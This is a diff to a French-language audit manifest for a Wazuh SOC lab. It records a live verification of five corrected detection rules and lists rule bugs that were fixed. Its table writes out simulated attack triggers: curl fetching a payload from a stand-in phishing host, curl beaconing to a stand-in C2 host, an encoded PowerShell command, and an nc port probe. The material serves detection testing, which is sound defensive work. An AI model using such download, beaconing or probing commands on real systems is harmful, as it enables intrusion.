@@ -39,6 +39,29 @@ comme preuve d'audit indépendante des captures.
 | MISP Event ID | référence explicite au cas #1344 dans le commentaire de l'attribut `ip-src` (ID d'événement MISP à renseigner) |
 | Captures | 21, 22, 23, 24, 25, 26, 27 |
 
+## Vérification live des règles corrigées (README, section "Détection avancée")
+
+Contrairement aux sections précédentes, les valeurs ci-dessous ont été extraites directement
+de l'indexeur Wazuh au moment du test (pas de champ `(à renseigner)`) : chaque règle a été
+redéployée sur `single-node-wazuh.manager-1`, testée positif/négatif via `wazuh-logtest`, puis
+déclenchée une nouvelle fois en conditions réelles (agent réel, indexation réelle) pour produire
+les captures 42-46.
+
+| Champ | 100099 (fetch suspect) | 100101 (PowerShell) | 100103 (beaconing) | 100105 (mvt. latéral) | 100107 (sondage) |
+|---|---|---|---|---|---|
+| Timestamp (UTC) | 2026-07-18T17:55:47.939Z | 2026-07-18T18:55:50.248Z | 2026-07-18T17:56:13.770Z | 2026-07-18T18:56:34.140Z | 2026-07-18T18:55:56.113Z |
+| Agent | soc-lab (001) | soc-lab (001) | soc-lab (001) | soc-lab (001) | soc-lab (001) |
+| Commande réelle | `curl -o /tmp/payload_v2.sh http://phishing-v2-simulated.example.invalid/payload.sh` | `pwsh -enc ZQBjAGgAbwAgAHYAMgAtAHQAZQBzAHQA` | 3× `curl http://c2-v2-simulated.example.invalid/checkin` (5-9s d'intervalle) | connexion SSH puis `sudo whoami` × 2 | `nc -z -w2 127.0.0.1 8080` |
+| Niveau | 8 | 12 | 10 | 10 | 6 |
+| Capture | `42_wazuh_alert_100099_v2_verified.png` | `46_wazuh_alert_100101_verified.png` | `44_wazuh_alert_100103_verified.png` | `43_wazuh_alert_100105_verified.png` | `45_wazuh_alert_100107_verified.png` |
+
+Bugs trouvés et corrigés pendant cette vérification (voir README pour le détail complet) :
+`full_log` non interrogeable pour `auditd` (corrigé via `<regex>` sans attribut `field`) ;
+`100103` chaînée sur la mauvaise règle parente (`100099` → `100098`) ; `same_source_ip` puis
+`same_user` structurellement incapables de corréler `5715` (sshd) et `5402` (sudo) — corrigé en
+se limitant à la proximité temporelle, limite documentée explicitement dans le commentaire de la
+règle et dans le README.
+
 ## Comment compléter ce manifeste
 
 ```bash
